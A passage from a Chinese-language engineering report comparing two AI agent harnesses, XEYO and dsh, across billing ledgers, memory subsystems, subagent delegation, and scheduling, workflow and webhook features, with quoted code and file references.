    miss += prompt - hit - miss                  # ③ 差额并入 miss
```

注释（`:146-147`）解释为什么这样能对齐厂商口径：「无独立 write 档的厂商（DeepSeek）由 `miss = prompt − hit` 把 uncached+cacheWrite 合并为 miss，故 `hit/(hit+miss)` 与该公式等价」。

**账本实现（`python/usage/ledger.py`）**：

| 项 | 实现 |
|---|---|
| 单文件上限 | `_MAX_LINES = 80_000`（`:16`）——**账本文件有行数上限**，防无限增长 |
| 路径 | `usage_dir()` / `events_path()`（`:20-29`） |
| key 指纹 | `key_fingerprint(api_key)`（`:31`）——**API key 不明文入账本** |
| 记录入账 | `record_from_openai_usage(...)`（`:45`）适配 OpenAI usage 形状 |
| 追加 | `_append(event)`（`:133`）+ `_read_events()`（`:142`） |
| 查询 | `query_usage(...)`（`:250`），带 `_day_list` / `_hit_rate` / `_bucket_view` / `_series_from` |
| 专用账本 | `c2_events_path()` / `record_c2_event` / `read_c2_events`（压缩事件账本）；`calibration_events_path()` / `record_calibration_shot`（**校准快照**，`:379-388`） |

`usage/` 目录共 7 文件：`attribution.py`（归因）、`combine.py`、`ledger.py`、`multi_agent_metrics.py`（多代理指标）、`pricing.py`、`vendor.py`。

###### 14.2 dsh：只有 token，没有钱

实测：`packages/llm/token-meter`（独立包）+ `TokenUsage` 类型，随 `assistant/message.usage` 一起持久化（`types.ts:305` 注释：「so the model output and its accounting travel together (**there is no separate usage record**)」）。**没有任何货币、价格表、账本**——grep 全仓未见 cost/pricing 相关模块。

###### 14.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 计费 | **无**（只有 token 计数） | 完整（表 + 峰谷 + 折算 + 限额） |
| usage 与消息的关系 | **内嵌**在 `assistant/message.usage`（无独立记录） | 独立 `UsageEvent` + `FinalEvent` 快照 |
| 价格来源 | — | 本地表 + 上游实时价 + `XEYO_TIME_TIERS_JSON` 覆盖 |
| 峰谷 | — | 数据驱动窗口 + 倍率，可覆盖 |
| 记账持久化 | — | JSONL 账本（80000 行上限）+ key 指纹 + C2 专账 + 校准账 |
| 归因 | — | `attribution.py` + `multi_agent_metrics.py` |
| 前端呈现 | 无 | `context_breakdown` 分段用量条 + `usd_limit` 倒计时字段 |

**判断**：这一项是**单向**的——XEYO 的运营性资产，dsh 完全没有，且不是「缺一层」而是「不在同一问题域」（dsh 是 harness 给下游产品，钱由下游算）。

---


## 域 18 · 记忆子系统

> 来源：**R1 功能面·全量对比** · 原节「20. 记忆」（源 L408–418）

##### 20. 记忆

| | XEYO | dsh |
|---|---|---|
| 实现 | `python/memory/` **48 文件**：投影、journal、compact、summarize、search、`simulator/`（离线标定） | **未见**独立记忆子系统 |
| 自动召回 | 存在但**恒关**（`python/engine/query_loop.py:356` `_memory_index_live_enabled` return False，09-09 事故后退役） | 不适用 |
| 工具面 | `Memory` 工具 | 不适用 |
| 替代方案 | — | 靠 `session-query`（查历史）+ `agent-instructions`（AGENTS.md）+ 项目文档；**没有跨会话长期记忆** |

---


> 来源：**R2 设计面·设计级对比** · 原节「16. 记忆子系统」（源 L835–862）

##### 16. 记忆子系统

###### 16.1 XEYO：完整模型，但自动召回已退役

- **数据模型**（`memory/governance.py`）：`MemoryNote`（`:25-44`）——`id / type(user|feedback|project|reference) / content / source / confidence / status(active|superseded|deleted) / scope(user|workspace|project|task) / last_used_at / expires_at / supersedes`；`MemoryCandidate`（`:56-62`）为过闸前态；`Tombstone`（`:47-53`）防 NightShift 复活。
- **写入时机**：经 `Memory` 工具（模型/用户发起），落 `memindex.store_fragments`（`memory/memindex.py:293`）——**非每轮自动**。
- **召回**：`search.search()`（`memory/search.py:212`，`score_note` / `_recency_bonus` 重排）、`search_session_notes`（`:373`）、`search_rollout_summaries`（`:480`）。
- **自动召回恒关**：`engine/query_loop.py:355-363` 直接 `return False`，注释「事故 sess_mtiche8l（弱模型把索引条目当任务对象）后已退役」；`memory/memory_switches.py:48-51` 同步「恒 False（不看本键），受控重开须源码级 + A1/A3 证据门」。
- 规模：`python/memory/` **48 文件**，含离线标定 `simulator/`。

###### 16.2 dsh：没有独立记忆子系统

- grep `ctx.memory | memory seam | long-term` 在 `packages/` 无命中。
- 长期知识靠三样替代：`session-query` 工具（**查本会话**历史）+ `agent-instructions`（AGENTS.md）+ 项目文档。**无跨会话长期记忆**。

###### 16.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 跨会话记忆 | 无 | 有完整模型（48 文件） |
| 自动召回 | 不适用 | **已退役**（恒关） |
| 当前实际形态 | 会话内查询 + 文档 | 显式 `Memory(action=search)` 才召回 |
| 事故教训 | 无 | 有：索引条目被弱模型当任务对象 |

**一个值得记的判断**：XEYO 建成了记忆子系统，又因事故把自动召回关掉——这个"建了又关"的过程本身就是结论：**记忆的难点不在存，在于"什么时候把什么塞回注意力"**。dsh 选择不建，反而绕过了这个坑。

---


> 来源：**R3 实现面·实现级对比** · 原节「15. 记忆子系统：实现级」（源 L1526–1580）

##### 15. 记忆子系统：实现级

###### 15.1 XEYO：30 个文件的完整子系统

**实测**：`python/memory/` 有 **30 个条目**。本轮读到实现细节的模块：

| 模块 | 实现级事实 |
|---|---|
| `runtime.py` | C2 摘要与老化：`c2_llm_summary_enabled()`、`_append_c2_instruction(messages)`、`_resolve_c2_summary(...)`、`maybe_advance_aging_boundary(messages, working) -> bool`、`idle_seconds(working)` |
| `runtime.py` 的**配对安全切点** | `_assistant_tool_ids(msg)` / `_tool_result_ids(msg)` → `_pair_ranges(messages)` → **`pair_safe_cut(messages, cut)`** → `c2_cut_index(messages, s0)`。**即压缩切点必须落在 tool_use/tool_result 配对边界之外**，不能把一对拆散 |
| `memdir.py` | 记忆目录模型：`workspace_id(canonical_path)`、`workspace_path(wsid)`、`resolve_memdir_id(wsid, scope)`、`memdir_root(wsid)`、`ensure_layout(wsid, canonical_path)` |
| `memdir.py` 的 frontmatter | `split_frontmatter(text)` / `_parse_fm(text)` / `dump_frontmatter(data)`——**记忆条目是带 YAML frontmatter 的 markdown** |
| `memdir.py` 的保留策略 | `retention_days()`（`:39`）+ **`prune_dead_notes(wsid, now)`（`:47`）**——记忆有 TTL 与清理 |
| `memdir.py` 的索引 | `topic_filename(note)`、`note_topics_path(note, wsid)`、`note_location(note, wsid)`、`index_line(note)`——索引行由笔记生成 |
| `write_policy.py` | `refuse_reason(title, content) -> str \| None`——**写入前先问「为什么拒绝」**，返回原因串 |
| 其他 | `governance.py`、`journal.py`、`nightshift.py`（夜间整理）、`observe.py`、`search.py`、`summarize.py`、`rerank_preference_shadow.py`、`citation.py`、`l5_flag.py`、`simulator/` 等 |

**自动召回恒关的实现（`engine/query_loop.py:355-363`，逐字）**：

```python
def _memory_index_live_enabled() -> bool:
    """Memory 索引常驻注入开关：**恒关**（2026-09-09 用户裁决维持下线）。

    事故 sess_mtiche8l（弱模型把索引条目当任务对象）后已退役，AGENTS「已下线」
    与此对齐。注入走 project_for_model 的 _append_memory_index 仍供脚本/评测用，
    生产投影层不推送；settings/env 残留一律忽略（同其他固化恒关项）。受控重开
    须源码级改此函数 + A1（200+ 轮 live）/ A3 过门证据。
    """
    return False
```

**实现级要点**：这是**代码常量**开关（不是配置项）——「settings/env 残留一律忽略」明示了配置无法改变行为；重开必须改源码 + 过两道路径证据。

###### 15.2 dsh：无跨会话记忆（穷举核实）

实测在整个 `packages/*/*/src/` 内：
- `MEMORY.md` / `memory.md` / `longTermMemory` / `persistentMemory` → **零命中**；
- `memory` 一词的命中全部是**技术同义词**（`attachment-local/store.ts` 的内存缓存、`core/session/src/index.ts` 的 in-memory、`seq-ranges.ts` 的 memo 等），**没有一个是「跨会话长期记忆」语义**。

**dsh 的替代物**：`context/session-reference`（会话引用）+ `tool-session-query` 五件套（`session_event_read/search/trace`、`session_search/trace`）——**dsh 让模型自己查历史，而不是给它一份自动召回的摘要**。这是与 XEYO 记忆子系统根本不同的取向。

###### 15.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 跨会话记忆 | **无**（穷举零命中） | 有（30 文件子系统） |
| 替代物 | 会话自查询工具（5 个，只读，按不可变 caller session 鉴权） | 记忆工具 + memdir 文件 + 索引 |
| 存储形态 | — | memdir（workspace_id 目录）+ YAML frontmatter + 索引行 + TTL 清理 |
| 写入准入 | — | `write_policy.refuse_reason(title, content)` |
| 召回 | — | **恒关**（`_memory_index_live_enabled()` 硬 return False） |
| 整理 | — | `nightshift.py` / `summarize.py` / `governance.py` |
| 与压缩的关系 | — | `pair_safe_cut` 保证 c2 切点不拆 tool 对 |

---


## 域 19 · 子代理与多代理

> 来源：**R1 功能面·全量对比** · 原节「13. 子代理与多代理」（源 L321–334）

##### 13. 子代理与多代理

| | XEYO | dsh |
|---|---|---|
| 实现 | `engine/subagent_runner.py`，**复用 `query_loop`**（不重建 QueryEngine），独立 MessageStore/BudgetTracker/WorkingSnapshot | `ctx.subagents` seam：`SubagentRuntime.start(name, request)`（`subagent/src/index.ts:554`） |
| Provider | 单一进程内实现 | `subagent-spawn-in-process`、`subagent-fork`、`subagent-acp`、**`subagent-claude-code`、`subagent-codex`**（后两者可选，`standard` preset 里 `disabled: true`） |
| 上下文继承 | `subagent_context.py`；侧链 `agents/{agent_id}.jsonl` 不污染主 JSONL | `child-agent.ts:68 parentAgentOptionsForDelegation`（继承 provider/model/effort/maxTokens）；`childSessionMeta`（继承 cwd/preset/parentSession/delegationDepth/origin） |
| 深/宽限制 | `_depth`/`max_depth`；`DEFAULT_SUB_MAX_TURNS=32` | `assertSubagentMaxDepth`（深度）；**未见全局 fan-out 上限**；冷列举并发 4 |
| 权限继承 | 未显式收窄 | **委托边界强制 `approvalPolicy:'never'`**（`child-agent.ts:245-246`），以 `source:'delegation'` 写入子日志 |
| 结果回流 | 结算事件 + `agent_settlement` T_now 块 | 一次性 `SubagentRun.result: Promise`；可续子代理经 `SubagentContinuationManager` 的 inbox（`sendMessage`/`steerPrompt`/`queuePrompt`） |
| 多代理团队 | `coord/` 工作池（feature flag）+ 多会话 peer 活动提醒 | `experimental/agent-team`：名册 + 共享任务 DAG + 邮箱（默认禁） |

---


> 来源：**R2 设计面·设计级对比** · 原节「17. 子代理与多代理」（源 L863–896）

##### 17. 子代理与多代理

###### 17.1 dsh：seam + 5 种 provider + 委托边界强制收窄

- **抽象**：`ctx.subagents`；`start(name, request): Promise<SubagentRun>`（`subagent/src/index.ts:554-566`）——provider 先建子再返回 run（fulfillment = 单一发布/所有权转移边界）。
- **Provider**：spawn-in-process / fork / acp / **claude-code** / **codex**（后两者在 `standard` preset 里 `disabled: true`）。
- **上下文继承**：`parentAgentOptionsForDelegation` / `childSessionMeta`（`index.ts:111-120`，`child-agent.ts`）——继承 provider/model/effort/maxTokens + cwd/preset/parentSession/delegationDepth/origin。深度 `assertSubagentMaxDepth`（`:557`）。
- **结果回流**：`SubagentRun.result: Promise`；可续子代理经 `SubagentContinuationManager` 的 inbox（`sendMessage` / `steerPrompt` / `queuePrompt`）（`:17-22`）。
- **权限收窄**：委托边界**强制 `approvalPolicy: 'never'`**（`child-agent.ts:245-246`），以 `source:'delegation'` 写入子日志——即"子代理不能被人类批准去做事"，防止审批链被用来放大权限。
- 注册表 = 命名 provider 注册（`registerProvider`，`:524`）；**未见全局 fan-out 上限**；冷列举并发 4。

###### 17.2 XEYO：单实现复用主循环 + 侧链 + 角色 TOML + 结算归因

- `subagent_runner.py` **复用 `query_loop`**（不重建 god object），独立 `MessageStore` / `BudgetTracker` / `WorkingSnapshot`；侧链 `agents/{agent_id}.jsonl` **不污染主 JSONL**（`:1-14`）；预算 `DEFAULT_SUB_MAX_TURNS=32`（`:23`）。
- **角色**：`agent_roles.py` 读 `<workspace>/agents/*.toml`，**fail-closed**（`:1-14, 39-79`）。
- **结算**：`agent_settlement.py` 进程内 FIFO，每会话封顶 16，产出 `agent_settlement` T_now 块（`:7, 16, 32-78`）。
- **多代理编排**：由 `scheduler.py` 的任务 DAG 支撑（见 §18；第一轮"未接线"已更正）。

###### 17.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 抽象 | seam + 5 provider | 单实现 |
| 复用 | provider 各自建子 | **复用主循环**（同一份 loop 代码） |
| 上下文隔离 | 子 session + `childSessionMeta` | 侧链 JSONL 不污染主日志 |
| 角色定义 | preset / provider | `<ws>/agents/*.toml`（fail-closed） |
| 权限 | 委托边界强制 `never` | 未显式收窄 |
| 结果回流 | Promise + 可续 inbox | 结算事件 + T_now 块 + 成本归因 |
| 成本 | 无 | `multi_agent_metrics.py` 归因 |

XEYO 的"复用主循环"是个反巨石的设计选择：不新建一套 sub-agent 引擎，而是给同一份 loop 换 store/budget/snapshot。代价是偶合，收益是行为一致性（子代理的每个 guard 与主代理同源）。

---


> 来源：**R3 实现面·实现级对比** · 原节「16. 子代理与多代理：实现级」（源 L1581–1633）

##### 16. 子代理与多代理：实现级

###### 16.1 dsh：seam + 7 种 provider + 持久化深度

**provider 包（实测 10 个）**：`subagent`（seam + `child-agent.ts` + `depth.ts` + `descriptor.ts`）、`subagent-in-process-driver`、`subagent-spawn-in-process`、`subagent-fork-in-process`、`subagent-acp`、`subagent-claude-code`、`subagent-codex`、`subagent-dsh-sdk`、`tool-subagent`、`tool-subagent-control`。共 **102 文件 / 33,523 行**——是 dsh 最大的能力域之一。

**深度控制是持久化的**（`packages/subagent/subagent/src/child-agent.ts:44-56`）：

```ts
export function resolveChildDepth(parent: Agent, maxDepth: number | undefined): number {
  const childDepth = delegationDepthOf(parent) + 1
  …
  if (maxDepth !== undefined && childDepth > maxDepth) {
    throw new SubagentDepthError(childDepth, maxDepth)     // 消息：`subagent depth X exceeds maxDepth Y`
  }
}
```

深度来源是 **session header 的 `delegationDepth`**（§2.1）——头注释解释了为什么必须落盘：「recursion budget survives restart and resume — a runtime-only depth would reset a resumed child to top-level」。

**能力收窄是强制的**：`subagent-acp` 的注释（`:143`）列出子代理**无法兑现**的请求项：`agentOptions` / `outputSchema` / `maxDepth` / `toolFilter`——即**委托边界按 provider 能力显式收窄，不假装支持**。

**工具面**（tool-catalog）：`subagent`（名字可配，默认 `subagent`）、`subagent_fork`（固定路由）、`list_subagent_models`；控制面 `send_message` / `interrupt_agent` / `list_agents`（**全局唯一注册**，且 `list_agents` 来自单独加载的 `/list-agents` 插件）。**向后连续性**：`tool-subagent-control` 的 docstring 说这些是「control tools over continuable background subagents」——子代理可续跑。

**实验性多代理**：`experimental/agent-team`（9 个工具）——`spawn_teammate` / `wait_agent` / `team_task_create|get|list|update` / `interrupt_agent` / `list_agents` / `send_message`；事件 `team/member` / `team/task` / `team/message/queued|delivered`。**shipped base bundle 默认禁用**（tool-catalog 原文）。

###### 16.2 XEYO：单实现复用主循环 + 侧链 + 结算

- **`engine/subagent_runner.py`**：`SubagentRuntime` / `SubagentRunResult` 数据类；`run_subagent(...)` → `_run_subagent_body(...)`；`subagent_budgets_for_scope(scope_paths) -> tuple[int,int]` 按写入 scope 给预算；
- **侧链存储**：`_sidechain_dir(main_session_id)` / `_flush_subagent_snapshot(...)` / `_meta_path(main, agent_id)` / `upsert_subagent_meta(...)` / `list_subagent_metas(main)` / `load_sidechain_messages(main, agent_id)` / `clear_sidechain(...)`；
- **续跑**：`_followup_max_turns()` / `_followup_max_tool_calling()` / `_followup_limit()` / `_followup_user_text(text)`——**续跑有独立配额与文本包装**；
- **流式**：`_StreamingTeeClient`（`:76`）——把子代理的流**旁路转发**给父；
- **写陈旧检测**：`_detect_write_stale(messages)`（`:610`）；
- **结论可用性**：`_usable_conclusion(messages, conclusion)`（`:567`）——**结算前校验结论是否可用**；
- **结算**：`engine/agent_settlement.py` + T_now 的 `agent_settlement` 块（event 类，drain 语义）；
- **角色**：`engine/agent_roles.py`（TOML 角色定义）；
- **DAG 调度**：`engine/scheduler.py`（§17）。

###### 16.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| provider 数 | **7 种**（in-process / spawn / fork / acp / claude-code / codex / dsh-sdk） | 1 种（复用主循环） |
| 深度控制 | `delegationDepth` **持久化在 session header**；`SubagentDepthError` | 有（`agent_roles` + write scope），未见持久化深度字段 |
| 能力收窄 | 显式（provider 不支持的请求项被点名） | 隐式（子 agent 注册表来自静态工厂 + `subagent_ok` 标记） |
| 工具面 | `subagent` / `subagent_fork` / `list_subagent_models` / `send_message` / `interrupt_agent` / `list_agents` | 单 `Agent` 工具（+ `agent_tool/` 包） |
| 后台续跑 | 有（continuable background subagents） | 有（`_followup_*` 配额） |
| 结算 | 子会话事件自然回流 | `agent_settlement` T_now 块 + `_usable_conclusion` 校验 |
| 多代理团队 | **experimental agent-team（9 工具 + 3 类事件）**，默认禁用 | 无团队概念（`multi_agent_hint` 块 + DAG 调度） |
| 写冲突 | 未见（沙箱层兜底） | `write_scope` 硬门禁 + `_detect_write_stale` |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§12 Skill / 子代理：逐字段」（源 L1092–1154）

##### §12 Skill / 子代理：逐字段

###### 12.1 Skill

**dsh**（`skill/skill-filesystem/src/index.ts`）

| 项 | 内容 |
|---|---|
| 发现 | 用户根目录递归发现（`discoverRoot`），`root.skipSystem` 时跳过 `.system` 目录 |
| frontmatter | YAML；解析出 `name` + `description`（`:101-108`、`:211-212`） |
| 注册结构 | `SkillInfo{name, description, provider}`（`:147`）；provider 默认名 `filesystem`（`:50`、`:161`） |
| 正文加载 | 经 `ctx.fs` 加载（能力缝复用，非直接 fs） |
| 排序 | `entries.sort((a,b) => a.name.localeCompare(b.name))`（`:722`） |
| 注册表 | `ctx.skills` 服务 |

**XEYO**（`tools/meta.py` + `extension/config.py`）

| 项 | 内容 |
|---|---|
| 路径 | `.xeyo/skills/<name>/SKILL.md` |
| 暴露形式 | **工具** `Skill`（`policy=always_allow`, `subagent_ok=True`, `subagent_baseline=False`） |
| 短描述 | "Load on-demand playbook from .xeyo/skills/<name>/SKILL.md." |
| 配置 | `settings.json` 的 `skills: {"<name>": {"enabled": true}}` |
| 直呼 | T_now 第 20 块 `skill_preinvoke`（用户 `/name` 直呼时的宿主确定性加载） |
| 目录变更 | `reconcile_events` 块（事件类，静默即失） |

**差异**：dsh 的 skill 是**注册表能力**（`ctx.skills` seam，可被任意消费者用），XEYO 的 skill 是**一个工具**（模型必须主动调）。dsh 支持 catalog/loader 工具（前轮已核），XEYO 只有单一 `Skill` 工具。frontmatter 字段：dsh 明确只用 `name` + `description`；XEYO 未设独立 frontmatter 解析（由工具实现自行读取）。

###### 12.2 子代理

**dsh `SubagentDescriptor` 逐字段**（`subagent/subagent/src/descriptor.ts`）

| 字段 | 类型 | 模式 |
|---|---|---|
| `version` | `number` | 两者 |
| `mode` | `'one-shot' \| 'continuable'` | 两者 |
| `provider` | `string`（`ctx.subagents` provider 名） | 两者 |
| `label?` / `label` | `string` | one-shot 可选 / continuable 必填 |
| `agentProvider?` | `string` | continuable |
| `agentModel?` | `string` | continuable |
| `agentReasoningEffort?` | `ReasoningEffortId` | continuable |
| `persona?` | `string` | continuable（**resume 时遮蔽部署 persona**） |
| `toolFilter?` | `ToolRestriction` | continuable（**resume 时重新施加**） |

**关键设计**：递归深度存在 **`SessionHeader.delegationDepth`**（父深度 + 1），注释原文：

> Persisted so a recursion budget survives restart and resume — **a runtime-only depth would reset a resumed child to top-level**.

**XEYO**：`Agent` 工具（`policy=agent_allow`, `needs_write_store=True`, `needs_runtime_provider=True`, `subagent_ok=False`）；短描述声明"sub-agents: **Git + readonly Bash sandbox**; no Memory/nested Agents"；配套 `FORBIDDEN_SUB_TOOLS`（`enabled and not subagent_ok`）与 `SUBSET_TOOL_BASELINE` 白名单；还有 `subagent_baseline=False` 的例外项（`Skill` / `NotebookEdit`）。

**差异**

| 维度 | dsh | XEYO |
|---|---|---|
| 描述符 | ✅ 类型化 9 字段 + 版本号 | ❌（注册表白名单 + 运行时参数） |
| 可续跑 | ✅ `continuable` + persona/toolFilter 重施 | 短生命周期（"short-lived"） |
| 深度预算 | ✅ 持久化到 header | ❌ |
| 控制工具 | 4 个（list/interrupt/send_message/list_subagent_models） | 1 个（Agent，无控制面） |
| 团队模式 | ✅ 6 个 team_* 工具（实验） | ❌ |
| 子代理隔离 | 沙箱 + toolFilter | 工具白名单（Git + 只读 Bash） |

---


## 域 20 · 调度 / 后台任务 / 工作流 / Webhook

> 来源：**R1 功能面·全量对比** · 原节「14. 调度 / 后台任务 / Webhook / 工作流」（源 L335–345）

##### 14. 调度 / 后台任务 / Webhook / 工作流

| 能力 | XEYO | dsh |
|---|---|---|
| 定时任务 | `engine/scheduler.py`（**1110 行 DAG，审计确认为"写了无消费方"未接线**） | `ctx.schedule` 运行时（每 root agent 进程内定时器）+ `schedule_*` 三工具；`schedule/change` 事件持久化（`schedule/runtime.ts:77,268-294`） |
| 后台任务 | `job_*` 三工具 + `server/job_registry.py` | `ctx.jobs` seam + `jobs-local`；`job_*` 三工具；**kind-agnostic**（bash 后台/PTY send/子代理同一套控制器） |
| Webhook | **未见** | `ctx.webhookRuntime` + 规则注册 + `createWebhookSession`（`webhook/src/index.ts:58,89,126,142`）；示例 `webhook-github`（HMAC 校验、路由、`maxBodyBytes`） |
| 工作流脚本 | **未见** | `ctx.workflowEngine` + worker-thread 执行（`vm.Script`，`workflow-worker-thread/src/runtime.ts:91-115`），hooks `agent/parallel/pipeline/phase/log`，并发槽 `maxConcurrentAgents`/`maxTotalAgents`/`maxItemsPerCall` |

---


> 来源：**R2 设计面·设计级对比** · 原节「18. 调度 / 后台任务 / 工作流 / Webhook」（源 L897–928）

##### 18. 调度 / 后台任务 / 工作流 / Webhook

###### 18.1 dsh：四件套齐全

- **定时**：`ScheduleRuntime` 每 root agent 进程内定时器，持久化 `schedule/change` 事件（`schedule/schedule/src/runtime.ts:1-130, 77`）；工具 `schedule_create/list/delete`。
- **后台**：`ctx.jobs` **kind-agnostic** seam（bash 后台 / PTY send / 子代理共用同一控制器），`job_output/list/kill`（`jobs/jobs/src/index.ts:1-91`）。
- **Webhook**：`ctx.webhookRuntime` 规则注册 + `createWebhookSession`（`webhook/webhook/src/index.ts:1, 57-130`）；示例适配器 `webhook-github`（HMAC 校验、路由、`maxBodyBytes`）。
- **工作流**：`ctx.workflowEngine` worker-thread 执行（`vm.Script`，`workflow-worker-thread/src/runtime.ts:91-115`），hooks `agent/parallel/pipeline/phase/log`，并发槽 `maxConcurrentAgents` / `maxTotalAgents` / `maxItemsPerCall`；工具 `workflow` + `ralph`。

###### 18.2 XEYO：后台对等，DAG 已接线，缺时间触发与工作流

- **后台**：`job_output/list/kill` 三工具（`tools/job_tools.py`）+ `server/job_registry.py`——与 dsh 对等。
- **任务 DAG**：`engine/scheduler.py`（1110 行）——`Task` / `toposort` / `scope_conflicts` / `build_tool_whitelist` / `repair_task_graph` / `run_task_batch` / checkpoint 系列。**已接线于多代理编排**（§0.2 已更正）。语义是**路径作用域互斥**（`scope_conflicts` 做路径归一后交集判定，`coord/store.py:10,68` 明确复用）。
- **时间触发型定时任务**：**未见**（这才是 XEYO 真缺的）。
- **工作流脚本 / Webhook**：**未见**（无 `workflow` 工具、无 webhook 入口）。
- **计划与待办**：`/goal` 斜杠 + `server/routers/goals.py`；`TodoWrite` 工具。

###### 18.3 设计分歧

| 能力 | dsh | XEYO |
|---|---|---|
| 时间触发定时 | 有（进程内定时器 + 持久事件） | **无** |
| 后台任务 | seam，kind-agnostic | `job_*` + job_registry |
| 任务 DAG | `agent/pre-step` 内的分解 | `scheduler.py`（路径作用域互斥 + checkpoint） |
| 工作流脚本 | 有（worker-thread + 5 hook） | **无** |
| Webhook 入口 | 有（含 GitHub 适配） | **无** |
| 待办 | `todo_write`（`todo/write` 事件） | `TodoWrite` |

XEYO 的 `scheduler.py` 有一个 dsh 没有的设计点：**作用域互斥**（两个子任务若触碰同一路径则冲突，必须串行）——这是为"并行改同一个工作区"这一真实风险设计的，dsh 的分解没有等价约束。

---


> 来源：**R3 实现面·实现级对比** · 原节「17. 调度 / 后台 / 工作流 / Webhook：实现级」（源 L1634–1705）

##### 17. 调度 / 后台 / 工作流 / Webhook：实现级

###### 17.1 dsh

**① Schedule（持久化提醒，实测三种记录类型）**（`packages/schedule/schedule/src/types.ts`）：

```ts
export type ScheduleId = Branded<'ScheduleId'>     // 一个会话内唯一且永不复用

interface AfterScheduleRecord  { id; kind:'after'; prompt; afterSeconds: number; scheduledAt: string }
interface AtScheduleRecord     { id; kind:'at';    prompt; scheduledAt: string }   // RFC 3339 UTC（四位年）
interface EveryScheduleRecord  { id; kind:'every'; … }   // 固定频率，下一目标保持与创建锚点对齐
```

- **三条创建路径**：`after_seconds`（正延迟）、显式绝对 `at`、有界固定频率 `every_seconds`（tool-catalog 原文）；
- **交付是会话本地的**（session-local delivery），且「management reads and mutations require the shared Session persistence barrier」；
- 只注册在**插件加载后创建的 live root Agent scope** 内（即老会话没有这个工具）；
- 事件 `schedule/change`。

**② Jobs**：`jobs`（seam）+ `jobs-local`（实现）+ `tool-jobs`；后台产者三类（bash / PTY send / subagent）统一收口到三个工具。

**③ Webhook**（17 文件 / 2,059 行）：入站入口，`webhook` 包。

**④ Workflow**：`workflow`（能力）+ `workflow-worker-thread`（provider）+ `tool-workflow` + **`tool-ralph`**。`ralph` 的实现证据（`tool-ralph/src/index.ts`）：

```ts
name: 'ralph-loop',                                        // :79
'You are one fresh worker in a foreground Ralph loop. You receive no parent conversation and no prior child session. Do not call the ralph tool: this round already is its worker.'   // :154
```

即 **Ralph 循环 = 每一轮起一个全新结构化子代理（无父会话、无先验子会话）**，模型只能选**不可变目标 + 可选轮数上限**（tool-catalog 原文），且**worker 被明确告知不要再调 ralph 工具**（防递归）。事件 `tool-workflow/run-start|run-end|agent-start|agent-end`（实测 4 个）。

###### 17.2 XEYO

**`engine/scheduler.py`（1110 行）——本轮实测其真实能力**：

| 符号 | 行 | 作用 |
|---|---|---|
| `Task` / `TaskRunResult` | `:37` / `:29` | 任务与结果数据类 |
| `toposort(tasks)` | `:109` | **拓扑排序**（真 DAG） |
| `scope_conflicts(...)` | `:134` | 写 scope 冲突检测 |
| `_break_cycles(tasks)` | `:154` | **环检测与打破** |
| `build_tool_whitelist(task)` / `batch_tool_whitelist(tasks)` | `:191` / `:202` | 按任务构建工具白名单（并集） |
| `repair_task_graph(...)` | `:215` | 任务图修复 |
| `turns_for_timeout(timeout_s)` | `:243` | 超时→轮数换算 |
| `Scheduler` | `:249` | 调度器主体 |
| `scheduler_state_path` / `read_scheduler_checkpoint` / `checkpoint_is_incomplete` / `checkpoint_awaiting_synthesis` / `clear_scheduler_checkpoint` | `:905-1000` | **checkpoint 持久化**（崩溃恢复） |
| `last_user_goal_path` / `write_last_user_goal` / `checkpoint_summary` | `:1003-1029` | 目标与摘要 |
| `run_task_batch(...)` | `:1054` | 批量执行 |

**关键实测结论（修正第二轮的定性）**：这是**多代理任务 DAG 调度器**，被 `subagent_runner.py`（5 处导入）、`server/session_pool.py:887 scheduler_for`、`chat.py` checkpoint、`coord/store.py` 与多个 test 消费。**XEYO 真缺的是「时间触发型定时任务」**（用户说「明天 9 点」→ 无人接），而不是这个模块。

**后台作业**：`tools/job_tools.py` 三件套 + 24h 超时（事实无超时）+ 完成补投走 `pending_jobs` T_now 块（directive，一次性待领信息）。

**Webhook / 定时 / 工作流**：**未见**（`workflow` 全仓零命中）。

###### 17.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 时间触发定时 | **有**（after / at / every 三种，持久化 + RFC3339 UTC + 锚点对齐） | **无** |
| 任务 DAG | 无（`team/task` 是实验性团队任务） | **有**（toposort + 环打破 + scope 冲突 + checkpoint） |
| 后台作业 | 有（kind-agnostic 三工具） | 有（三工具，24h 事实无超时） |
| Webhook | 有（独立包） | 无 |
| 工作流引擎 | 有（worker-thread provider + `ralph` 循环） | 无（`workflow` 零命中） |
| Ralph 循环 | 有（每轮全新子代理 + 明确禁止递归） | 无 |
| 崩溃恢复 | checkpoint 由 `dsh-session-checkpoint-policy` 拥有（每请求持久化检查点） | `scheduler.py` 自带 checkpoint + `checkpoint_is_incomplete` / `awaiting_synthesis` |

**结论**：两端在「编排」上**互补而非对齐**——dsh 有时间轴（schedule/workflow/webhook/ralph），XEYO 有关系图（DAG + scope 冲突 + 写锁）。两者各自都有对方完全没有的那一半。

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§13 调度 / 后台 / 工作流：逐字段」（源 L1155–1169）

##### §13 调度 / 后台 / 工作流：逐字段

| 能力 | dsh | XEYO |
|---|---|---|
| 定时任务 | ✅ `schedule/*`（`schedule_create/delete/list` + `schedule/change` 事件） | ❌ **无时间触发型定时任务**（`engine/scheduler.py` 是 **DAG 调度器**，非定时器——本轮维持前轮更正） |
| 后台作业 | ✅ `job_*` 3 工具 | ✅ `job_output/job_list/job_kill` 3 工具（同名同数） |
| 作业状态枚举 | `'running' \| 'stopping' \| 'completed' \| 'killed' \| 'failed'`（`SessionJob.status`） | `job_output` 尾部 `[status: ...]` 文本 |
| 工作流引擎 | ✅ `workflow` + `ralph` + `tool-workflow/{run,agent}-{start,end}` 4 事件 | ❌（全仓 `workflow` 零命中） |
| Webhook 入口 | ✅ `packages/webhook/` | ❌ |
| Goal | ✅ `create_goal/get_goal/update_goal` + `goal/change` | ✅ T_now `goal` 块（仅 blocked/pending_complete 注入） |
| Todo | ✅ `todo_write` + `todo/write` 事件 | ✅ `TodoWrite` 工具（`ToolResultEvent.todos` 结构化 UI 载荷） |
| 计划 | plan 为 **logged state**（`plan/mode`） | **mode**（`mode_instructions` 块）+ `plan_pending/resolved` 挂起三件套 |

---


## 域 21 · Skill 系统

> 来源：**R1 功能面·全量对比** · 原节「15. Skill 系统」（源 L346–356）

##### 15. Skill 系统

| | XEYO | dsh |
|---|---|---|
